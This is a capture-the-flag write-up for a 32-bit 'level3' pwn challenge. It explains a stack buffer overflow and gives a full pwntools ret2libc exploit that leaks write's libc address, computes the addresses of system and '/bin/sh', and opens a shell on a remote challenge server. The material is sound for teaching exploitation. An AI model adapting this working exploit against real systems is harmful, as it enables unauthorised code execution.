# Level3

## Challenge

- This challenge gives us 2 files one is ELF 32-bit executables and other is dynamic library.
- To simply the task, I used IDA to disassemle the level3 binary file, which make it easier to see what the program is doing

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  write(1, "Input:\n", 7u);
  return read(0, buf, 0x100u);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

## Overview & Idea

- Let's check the infomations of binary file

![img](/xctf/assets/file_check.png)

- The binary file has no stack protector, no PIE, so we can use BOF to overwrite ret of vulnerable_function with address of system() in libc to get shell.

## Detail

- First, I need to leak the address of write function (you can leak whatever function you want, the purpose of this stuff is find base address of libc). To do that, I must have to a call to write@plt and pass 3 parameter, param 1 is file descriptor, we want to print the address in screen so we put 1 in this param, param 2 is address of string which we'll put address of write@got.plt address that hold the current address of write in libc , param 3 is size of the string, the address is 4 bytes so we put value in this param is 4. To summary, we want to use write function to implement `write(1, write@got.plt, 4)` which will leak the address of write libc.

- The write@plt and write@got.plt I found

![img](/xctf/assets/print_write_libc.png)

- And we need the offset that we must overwrite to reach to the ret of vulnerable_function is `140 bytes`. This below is script that I use to leak write function address in libc

```python
padding = b"a"*140
vuln_addr = 0x0804844b
write_got_plt = 0x804a018
write_plt = 0x08048340

payload_1 = b""

payload_1 += padding
payload_1 += p32(write_plt)
payload_1 += p32(vuln_addr)     # After print the address, we return to vulnerable_funtion to implement get shell.
payload_1 += p32(0x1)
payload_1 += p32(write_got_plt)
payload_1 += p32(0x4)

leak = u32(p.recv(4))    # note: you need to check what output was printed to receive exactly the bytes of address
log.info(hex(leak))
p.recvline()
```

- After leaked the address, we need to calculate the current address of system function and "/bin/sh" string in program runtime by offset I found in given libc

```python
# offset
write_offset = 0xd43c0
sys_offset = 0x3a940
binsh_offset = 0x15902b

base_addr = leak - write_offset
sys_real = base_addr + sys_offset
binsh_real = base_addr + binsh_offset
```

- So we have enough material to get the shell. Let's do it!

## Exploit

```python
# file name: test.py

from pwn import *

p = remote("61.147.171.105", "62417")
#  elf = ELF("./level3_patched")
#  p = elf.process()
#  gdb.attach(p)


# necessary
padding = b"a"*140
vuln_addr = 0x0804844b
write_got_plt = 0x804a018
write_plt = 0x08048340

payload_1 = b""

payload_1 += padding
payload_1 += p32(write_plt)
payload_1 += p32(vuln_addr)
payload_1 += p32(0x1)
payload_1 += p32(write_got_plt)
payload_1 += p32(0x4)

p.recvline()
p.sendline(payload_1)

leak = u32(p.recv(4))
log.info(hex(leak))
p.recvline()

# offset
write_offset = 0xd43c0
sys_offset = 0x3a940
binsh_offset = 0x15902b

base_addr = leak - write_offset
sys_real = base_addr + sys_offset
binsh_real = base_addr + binsh_offset

payload_2 = padding
payload_2 += p32(sys_real)
payload_2 += b"aaaa"
payload_2 += p32(binsh_real)

p.sendline(payload_2)

p.interactive()
```

## Result

![img](/xctf/assets/result.png)

